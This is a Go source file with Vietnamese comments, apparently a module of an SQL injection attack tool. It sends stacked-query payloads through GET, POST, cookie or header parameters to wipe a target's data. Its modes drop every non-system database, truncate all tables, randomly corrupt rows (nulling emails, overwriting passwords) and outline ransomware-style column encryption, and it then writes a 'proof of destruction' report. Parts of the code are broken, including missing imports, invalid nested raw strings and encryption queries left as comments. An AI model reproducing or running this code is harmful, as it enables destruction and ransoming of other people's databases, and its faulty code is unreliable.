package cmd

import (
	"context"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/base64"
	"fmt"
	"strings"
	"time"

	"go.uber.org/zap"
)

type DestructResult struct {
	Mode        string   `json:"mode"`
	TargetDB    string   `json:"target_database"`
	TargetTable string   `json:"target_table"`
	Queries     []string `json:"queries_executed"`
	Success     bool     `json:"success"`
	Proof       string   `json:"proof"`
}

type DestructOptions struct {
	Mode       string // drop|truncate|corrupt|encrypt
	Database   string
	Table      string
	EncryptKey string
}

type Destructor struct{}

func NewDestructor() *Destructor {
	return &Destructor{}
}

func (d *Destructor) Execute(ctx context.Context, session *Session, opts DestructOptions) (*DestructResult, error) {
	logger := Logger()
	logger.Warn("Đang thực thi thao tác PHÁ HỦY",
		zap.String("mode", opts.Mode),
		zap.String("database", opts.Database),
		zap.String("table", opts.Table))
	
	if session.Injection == nil {
		return nil, fmt.Errorf("không có điểm tiêm")
	}
	
	if !session.Injection.IsStackable {
		return nil, fmt.Errorf("thao tác phá hủy yêu cầu hỗ trợ truy vấn xếp chồng")
	}
	
	result := &DestructResult{
		Mode:        opts.Mode,
		TargetDB:    opts.Database,
		TargetTable: opts.Table,
		Queries:     []string{},
	}
	
	var queries []string
	var err error
	
	switch opts.Mode {
	case "drop":
		queries, err = d.generateDropQueries(session, opts)
	case "truncate":
		queries, err = d.generateTruncateQueries(session, opts)
	case "corrupt":
		queries, err = d.generateCorruptQueries(session, opts)
	case "encrypt":
		queries, err = d.generateEncryptQueries(session, opts)
	default:
		return nil, fmt.Errorf("chế độ phá hủy không xác định: %s", opts.Mode)
	}
	
	if err != nil {
		return nil, err
	}
	
	// Thực thi từng truy vấn
	for _, query := range queries {
		payload := fmt.Sprintf("' ; %s -- ", strings.ReplaceAll(query, "\n", " "))
		resp, err := d.sendStackedPayload(ctx, session, payload)
		if err != nil {
			result.Queries = append(result.Queries, query+" [FAILED: "+err.Error()+"]")
			continue
		}
		
		result.Queries = append(result.Queries, query)
		
		// Kiểm tra thành công
		if strings.Contains(strings.ToLower(resp.String()), "error") {
			result.Success = false
		} else {
			result.Success = true
		}
	}
	
	// Tạo bằng chứng
	result.Proof = d.generateProof(session, opts, result.Queries)
	
	return result, nil
}

func (d *Destructor) generateDropQueries(session *Session, opts DestructOptions) ([]string, error) {
	var queries []string
	dbms := session.DBMS.Type
	
	if opts.Database != "" {
		// Xóa một cơ sở dữ liệu cụ thể
		switch dbms {
		case "mysql":
			queries = append(queries, fmt.Sprintf("DROP DATABASE `%s`", opts.Database))
		case "postgres":
			queries = append(queries, fmt.Sprintf("DROP DATABASE %s", opts.Database))
		case "mssql":
			queries = append(queries, fmt.Sprintf("ALTER DATABASE %s SET SINGLE_USER WITH ROLLBACK IMMEDIATE; DROP DATABASE %s", opts.Database, opts.Database))
		case "oracle":
			queries = append(queries, fmt.Sprintf("DROP USER %s CASCADE", opts.Database))
		}
	} else if opts.Table != "" {
		// Xóa một bảng cụ thể
		switch dbms {
		case "mysql":
			queries = append(queries, fmt.Sprintf("DROP TABLE `%s`.`%s`", session.DBMS.Type, opts.Table))
		case "postgres":
			queries = append(queries, fmt.Sprintf("DROP TABLE %s", opts.Table))
		case "mssql":
			queries = append(queries, fmt.Sprintf("DROP TABLE %s", opts.Table))
		}
	} else {
		// Xóa TẤT CẢ cơ sở dữ liệu (trừ cơ sở dữ liệu hệ thống)
		switch dbms {
		case "mysql":
			queries = append(queries, `
				SELECT CONCAT('DROP DATABASE `, GROUP_CONCAT(schema_name SEPARATOR '`; DROP DATABASE `'), '`')
				FROM information_schema.schemata
				WHERE schema_name NOT IN ('information_schema','mysql','performance_schema','sys')
			`)
		case "postgres":
			queries = append(queries, `
				SELECT string_agg('DROP DATABASE ' || datname, '; ')
				FROM pg_database
				WHERE datistemplate = false AND datname NOT IN ('postgres','template0','template1')
			`)
		case "mssql":
			queries = append(queries, `
				DECLARE @sql NVARCHAR(MAX) = '';
				SELECT @sql = @sql + 'ALTER DATABASE ' + name + ' SET SINGLE_USER WITH ROLLBACK IMMEDIATE; DROP DATABASE ' + name + '; '
				FROM sys.databases
				WHERE database_id > 4;
				EXEC sp_executesql @sql;
			`)
		}
	}
	
	return queries, nil
}

func (d *Destructor) generateTruncateQueries(session *Session, opts DestructOptions) ([]string, error) {
	var queries []string
	dbms := session.DBMS.Type
	
	if opts.Table != "" {
		// Truncate một bảng cụ thể
		switch dbms {
		case "mysql":
			queries = append(queries, fmt.Sprintf("TRUNCATE TABLE `%s`", opts.Table))
		case "postgres":
			queries = append(queries, fmt.Sprintf("TRUNCATE TABLE %s", opts.Table))
		case "mssql":
			queries = append(queries, fmt.Sprintf("TRUNCATE TABLE %s", opts.Table))
		}
	} else {
		// Truncate TẤT CẢ bảng trong cơ sở dữ liệu
		switch dbms {
		case "mysql":
			queries = append(queries, `
				SET FOREIGN_KEY_CHECKS = 0;
				SELECT CONCAT('TRUNCATE TABLE `, GROUP_CONCAT(CONCAT(table_schema,'.',table_name) SEPARATOR '`; TRUNCATE TABLE `'), '`')
				FROM information_schema.tables
				WHERE table_schema = DATABASE();
				SET FOREIGN_KEY_CHECKS = 1;
			`)
		case "postgres":
			queries = append(queries, `
				SELECT 'TRUNCATE TABLE ' || string_agg(tablename, ', ') || ' CASCADE'
				FROM pg_tables
				WHERE schemaname = 'public';
			`)
		case "mssql":
			queries = append(queries, `
				DECLARE @sql NVARCHAR(MAX) = '';
				SELECT @sql = @sql + 'TRUNCATE TABLE ' + TABLE_SCHEMA + '.' + TABLE_NAME + '; '
				FROM INFORMATION_SCHEMA.TABLES
				WHERE TABLE_TYPE = 'BASE TABLE';
				EXEC sp_executesql @sql;
			`)
		}
	}
	
	return queries, nil
}

func (d *Destructor) generateCorruptQueries(session *Session, opts DestructOptions) ([]string, error) {
	var queries []string
	dbms := session.DBMS.Type
	
	// Làm hỏng dữ liệu: ngẫu nhiên hóa, gán null hoặc xóa dòng
	if opts.Table != "" {
		// Làm hỏng một bảng cụ thể
		switch dbms {
		case "mysql":
			queries = append(queries, fmt.Sprintf(`
				UPDATE `%s` SET 
				%s
				WHERE RAND() < 0.1
			`, opts.Table, d.getCorruptColumns(session, opts.Table)))
		case "postgres":
			queries = append(queries, fmt.Sprintf(`
				UPDATE %s SET 
				%s
				WHERE random() < 0.1
			`, opts.Table, d.getCorruptColumns(session, opts.Table)))
		case "mssql":
			queries = append(queries, fmt.Sprintf(`
				UPDATE %s SET 
				%s
				WHERE RAND() < 0.1
			`, opts.Table, d.getCorruptColumns(session, opts.Table)))
		}
	} else {
		// Làm hỏng TẤT CẢ bảng
		switch dbms {
		case "mysql":
			queries = append(queries, `
				SELECT CONCAT('UPDATE `, GROUP_CONCAT(CONCAT(table_schema,'.',table_name) SEPARATOR '` SET id = id * -1 WHERE RAND() < 0.1; UPDATE `'), '` SET id = id * -1 WHERE RAND() < 0.1')
				FROM information_schema.tables
				WHERE table_schema = DATABASE();
			`)
		case "postgres":
			queries = append(queries, `
				SELECT string_agg('UPDATE ' || tablename || ' SET ' || column_name || ' = NULL WHERE random() < 0.1', '; ')
				FROM information_schema.columns
				WHERE table_schema = 'public' AND data_type IN ('integer','bigint','text','varchar','timestamp');
			`)
		case "mssql":
			queries = append(queries, `
				DECLARE @sql NVARCHAR(MAX) = '';
				SELECT @sql = @sql + 'UPDATE ' + TABLE_SCHEMA + '.' + TABLE_NAME + ' SET ' + COLUMN_NAME + ' = NULL WHERE RAND() < 0.1; '
				FROM INFORMATION_SCHEMA.COLUMNS
				WHERE DATA_TYPE IN ('int','bigint','nvarchar','varchar','datetime');
				EXEC sp_executesql @sql;
			`)
		}
	}
	
	return queries, nil
}

func (d *Destructor) getCorruptColumns(session *Session, table string) string {
	// Trả về các phép gán dùng để làm hỏng cột
	return "id = id * -1, username = CONCAT('CORRUPTED_', username), email = NULL, password = 'DESTROYED', created_at = DATE_SUB(created_at, INTERVAL 365 DAY)"
}

func (d *Destructor) generateEncryptQueries(session *Session, opts DestructOptions) ([]string, error) {
	// Mã hóa cơ sở dữ liệu theo kiểu ransomware
	key := opts.EncryptKey
	if key == "" {
		key = generateRandomKey(32)
	}
	
	var queries []string
	dbms := session.DBMS.Type
	
	// Mã hóa mọi cột text/varchar trong tất cả bảng
	switch dbms {
	case "mysql":
		queries = append(queries, fmt.Sprintf(`
			SELECT CONCAT('UPDATE `, GROUP_CONCAT(CONCAT(table_schema,'.',table_name) SEPARATOR '` SET '), '` SET ')
			FROM information_schema.columns
			WHERE table_schema = DATABASE() AND data_type IN ('varchar','text','char','tinytext','mediumtext','longtext');
		`))
		// Lưu ý: mã hóa thực tế cần AES_ENCRYPT cho từng cột
		// Đây chỉ là template - triển khai thật phải duyệt qua bảng/cột
	case "postgres":
		queries = append(queries, fmt.Sprintf(`
			-- Requires pgcrypto extension
			-- UPDATE table SET col = PGP_SYM_ENCRYPT(col, '%s') WHERE col IS NOT NULL;
		`, key))
	case "mssql":
		queries = append(queries, fmt.Sprintf(`
			-- Requires symmetric key/certificate
			-- OPEN SYMMETRIC KEY RansomKey DECRYPTION BY CERTIFICATE RansomCert;
			-- UPDATE table SET col = ENCRYPTBYKEY(KEY_GUID('RansomKey'), col);
		`))
	}
	
	// Lưu key để "giải mã" (trong một cuộc tấn công thật, key có thể bị trích xuất)
	queries = append(queries, fmt.Sprintf("-- ENCRYPTION_KEY: %s", key))
	
	return queries, nil
}

func (d *Destructor) generateProof(session *Session, opts DestructOptions, queries []string) string {
	proof := fmt.Sprintf(`
=== BẰNG CHỨNG PHÁ HỦY ===
Thời gian: %s
Mục tiêu: %s
Chế độ: %s
Cơ sở dữ liệu: %s
Bảng: %s
Truy vấn xếp chồng: %v
DBMS: %s

Các truy vấn đã thực thi:
`, time.Now().Format(time.RFC3339), session.URL, opts.Mode, opts.Database, opts.Table, session.Injection.IsStackable, session.DBMS.Type)

	for i, q := range queries {
		proof += fmt.Sprintf("%d. %s\n", i+1, strings.ReplaceAll(q, "\n", " "))
	}
	
	return proof
}

func (d *Destructor) sendStackedPayload(ctx context.Context, session *Session, payload string) (*resty.Response, error) {
	client := session.GetClient()
	param := session.Injection.Parameter
	
	switch session.Injection.Type {
	case "GET":
		u, _ := url.Parse(session.URL)
		q := u.Query()
		q.Set(param, payload)
		u.RawQuery = q.Encode()
		return client.R().Get(u.String())
	case "POST":
		data := session.Data
		if strings.Contains(data, "=") {
			pairs := strings.Split(data, "&")
			for i, p := range pairs {
				kv := strings.SplitN(p, "=", 2)
				if len(kv) == 2 && kv[0] == param {
					pairs[i] = param + "=" + payload
				}
			}
			data = strings.Join(pairs, "&")
		} else {
			data = param + "=" + payload
		}
		return client.R().SetBody(data).Post(session.URL)
	case "COOKIE":
		return client.R().SetCookie(&http.Cookie{Name: param, Value: payload}).Get(session.URL)
	case "HEADER":
		return client.R().SetHeader(param, payload).Get(session.URL)
	}
	return nil, fmt.Errorf("kiểu không được hỗ trợ")
}

func generateRandomKey(length int) string {
	b := make([]byte, length)
	rand.Read(b)
	return base64.StdEncoding.EncodeToString(b)
}

func aesEncrypt(data, key string) (string, error) {
	block, err := aes.NewCipher([]byte(key))
	if err != nil { return "", err }
	gcm, err := cipher.NewGCM(block)
	if err != nil { return "", err }
	nonce := make([]byte, gcm.NonceSize())
	rand.Read(nonce)
	ciphertext := gcm.Seal(nonce, nonce, []byte(data), nil)
	return base64.StdEncoding.EncodeToString(ciphertext), nil
}
